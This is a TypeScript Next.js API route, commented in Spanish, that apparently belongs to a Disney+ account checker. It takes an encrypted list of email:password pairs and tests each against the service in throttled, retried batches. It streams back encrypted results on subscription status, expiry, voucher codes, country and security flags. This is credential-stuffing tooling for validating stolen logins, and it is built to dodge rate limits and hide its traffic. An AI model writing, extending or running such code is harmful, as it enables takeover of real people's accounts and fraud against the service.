import { NextResponse } from 'next/server';
import { DisneyAPI } from '../../../utils/disney/disneyApi';
import { encrypt, decrypt } from '../../../utils/encryption';

const BATCH_SIZE = 2; // Tamaño del lote reducido para evitar timeouts
const MAX_RETRIES = 3; // Número máximo de reintentos por lote
const RETRY_DELAY = 1000; // Tiempo de espera entre reintentos (1 segundo)

export const runtime = 'edge'; // Usar Edge Runtime para mejor rendimiento

interface CheckResult {
  success: boolean;
  error?: string;
  details?: {
    subscription?: string;
    subType?: string;
    description?: string;
    expireDate?: string;
    nextRenewalDate?: string;
    freeTrial?: string;
    lastConnection?: string;
    voucherCode?: string;
    earlyAccess?: string;
    emailVerified?: boolean;
    securityFlagged?: boolean;
    country?: string;
    maxProfiles?: number;
    userVerified?: boolean;
    email?: string;
    createdAt?: string;
  };
}

export async function POST(request: Request) {
  try {
    const encryptedData = await request.text();
    console.log('📦 Datos encriptados recibidos');
    
    let accounts: string[];
    try {
      const decryptedData = await decrypt(encryptedData);
      console.log('🔓 Datos desencriptados');
      accounts = JSON.parse(decryptedData);
    } catch (error) {
      throw new Error('Error al desencriptar los datos');
    }

    const stream = new TransformStream();
    const writer = stream.writable.getWriter();

    const sendResult = async (result: any) => {
      try {
        const encryptedResult = await encrypt(JSON.stringify({ result }));
        await writer.write(new TextEncoder().encode(`data: ${encryptedResult}\n\n`));
      } catch (error) {
        console.error('Error al enviar resultado:', error);
      }
    };

    // Función para procesar un lote con reintentos
    const processBatchWithRetry = async (batchAccounts: string[], retryCount = 0) => {
      try {
        const accountObjects = batchAccounts
          .map(account => {
            const [email, password] = account.split(':');
            return email && password ? { email, password } : null;
          })
          .filter((account): account is { email: string; password: string } => account !== null);

        // Si no hay cuentas válidas en el lote, saltar
        if (accountObjects.length === 0) {
          return;
        }

        const results = await Promise.race([
          DisneyAPI.checkBatch(accountObjects),
          new Promise<never>((_, reject) => 
            setTimeout(() => reject(new Error('Timeout')), 8000) // 8 segundos de timeout
          )
        ]) as CheckResult[];

        // Enviar resultados exitosos
        for (let j = 0; j < results.length; j++) {
          await sendResult({
            account: batchAccounts[j],
            ...results[j]
          });
        }
      } catch (error: any) {
        console.error(`Error en intento ${retryCount + 1}:`, error);
        
        // Si aún hay reintentos disponibles y es un error de timeout
        if (retryCount < MAX_RETRIES && (error.message === 'Timeout' || error.message?.includes('timeout'))) {
          console.log(`Reintentando lote después de ${RETRY_DELAY}ms...`);
          await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
          return processBatchWithRetry(batchAccounts, retryCount + 1);
        }

        // Si se agotaron los reintentos o es otro tipo de error, enviar error para cada cuenta
        for (const account of batchAccounts) {
          await sendResult({
            account,
            success: false,
            error: 'Error al verificar la cuenta después de varios intentos'
          });
        }
      }
    };

    (async () => {
      try {
        // Procesar las cuentas en lotes pequeños
        for (let i = 0; i < accounts.length; i += BATCH_SIZE) {
          const batchAccounts = accounts.slice(i, i + BATCH_SIZE);
          
          // Procesar el lote actual con sistema de reintentos
          await processBatchWithRetry(batchAccounts);

          // Pequeña pausa entre lotes para evitar sobrecarga
          if (i + BATCH_SIZE < accounts.length) {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }

          // Enviar heartbeat para mantener la conexión viva
          await writer.write(new TextEncoder().encode(': heartbeat\n\n'));
        }
      } catch (error) {
        console.error('Error en el stream:', error);
      } finally {
        await writer.close();
      }
    })();

    return new Response(stream.readable, {
      headers: {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no' // Deshabilitar buffering
      }
    });
  } catch (error: any) {
    const errorResponse = await encrypt(JSON.stringify({ 
      error: `Error al procesar la solicitud: ${error.message}` 
    }));
    
    return new Response(errorResponse, {
      status: 500,
      headers: { 'Content-Type': 'text/plain' }
    });
  }
} 